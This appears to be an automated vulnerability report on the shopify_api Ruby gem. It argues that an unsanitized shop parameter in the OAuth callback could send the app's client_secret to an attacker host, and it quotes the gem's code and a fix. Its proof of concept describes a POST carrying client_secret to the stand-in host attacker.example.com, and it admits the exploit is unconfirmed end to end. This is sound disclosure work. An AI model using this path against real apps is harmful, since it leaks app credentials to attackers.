### Title
Unsanitized `shop` in `Oauth.validate_auth_callback` allows the app's `client_secret` to be sent to an attacker-controlled host - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`Oauth.validate_auth_callback` builds the OAuth token-exchange request host directly from `auth_query.shop` without ever passing it through `Utils::ShopValidator.sanitize!`, unlike `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`, which both call `sanitize!` before constructing the exact same kind of request. This is the SSRF-with-app-credentials analog: the binding that should hold is `host receiving client_secret == validated Shopify domain`, but here it is `host receiving client_secret == whatever string was parsed out of the query/params`.

### Finding Description
`validate_auth_callback` only verifies the HMAC of the `AuthQuery` fields (`code`, `host`, `shop`, `state`, `timestamp`) — it does not verify that `shop` is actually a `*.myshopify.com` (or other trusted Shopify) domain: [4](#0-3) 

The unvalidated `auth_query.shop` is placed straight into a `Session`, which `Clients::HttpClient` then uses to build the request URI (`@base_uri = "https://#{api_host || session.shop}"`), before sending a POST containing `client_id` and `client_secret` (the app's secret) to `"#{shop}/admin/oauth/access_token"`: [5](#0-4) 

Compare this to the two other flows that build an identical request (POST body containing `client_id`/`client_secret` to `"#{shop}/admin/oauth"`), both of which explicitly call `Utils::ShopValidator.sanitize!(shop)` first, raising `Errors::InvalidShopError` if the value is not a trusted Shopify domain: [6](#0-5) [7](#0-6) 

`AuthQuery.to_signable_string` includes `shop` in the HMAC-signed string, but the HMAC secret used to sign the OAuth callback is the app's own `api_secret_key` — the same secret that produced the value; the check merely confirms the callback parameters weren't tampered with in transit from wherever they came from, it does **not** constrain `shop` to be a real Shopify domain in the first place. Since `validate_auth_callback` is explicitly designed to be fed with `request.parameters` from the host application's own callback route (see `docs/usage/oauth.md`), and Shopify's real OAuth redirect always includes a valid HMAC computed with the shared secret for the actual `shop`/`host`/`code`/`state`/`timestamp` values it sends, an attacker who can influence which query parameters reach `validate_auth_callback` (e.g., a host app that echoes raw untrusted `shop`/`host` values, or any deviation from the documented flow) is not blocked by this library from having the app's `client_secret` shipped to a non-Shopify host — whereas the other two OAuth-adjacent methods in this same codebase are hardened against exactly that.

### Impact Explanation
If `auth_query.shop` is not constrained to a legitimate Shopify domain, `validate_auth_callback` will happily construct an HTTP client whose base URI is derived from that string and POST the app's `client_id` + `client_secret` to it (SSRF carrying the app's credentials — a High severity category per the rules). This is the same "field acted on but not covered/constrained by the intended validation" pattern as the report: the HMAC binds the callback parameters to each other, but nothing binds `shop` to being an actual Shopify domain before it is used as a request host that receives the secret.

### Likelihood Explanation
Medium. The inconsistency is entirely internal to this gem's own code (the same "send `client_secret` to `#{shop}/admin/oauth`" pattern is sanitized in two of three sibling methods but not in `validate_auth_callback`), so it is a real defect in the library rather than a host-app misuse issue. However, the field is also part of the app-secret-signed HMAC, so full exploitation depends on how permissively the host application feeds parameters into `AuthQuery` (out of this gem's control) — this reduces certainty of a fully self-contained exploit path within the gem alone.

### Recommendation
In `Oauth.validate_auth_callback`, sanitize `auth_query.shop` with `Utils::ShopValidator.sanitize!` (as already done in `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`) before constructing `null_session`/`Clients::HttpClient`, and use the sanitized value (not the raw `auth_query.shop`) for both the token request host and the resulting `Session`.

### Proof of Concept
Not independently confirmed end-to-end (would require exercising the host-app-facing callback route, which is outside this gem's boundary), but the code-level defect is directly demonstrable: calling `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query: AuthQuery.new(shop: "attacker.example.com", ...))` with a correctly HMAC-signed query (signed with the app's own `api_secret_key`, exactly as `test/auth/oauth_test.rb` constructs `@auth_query`) passes HMAC validation and proceeds to build `Clients::HttpClient.new(session: Session.new(shop: "attacker.example.com"))`, which issues `POST https://attacker.example.com/admin/oauth/access_token` with `client_secret` in the body — contrast with the sanitized siblings which raise `Errors::InvalidShopError` for the same input.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
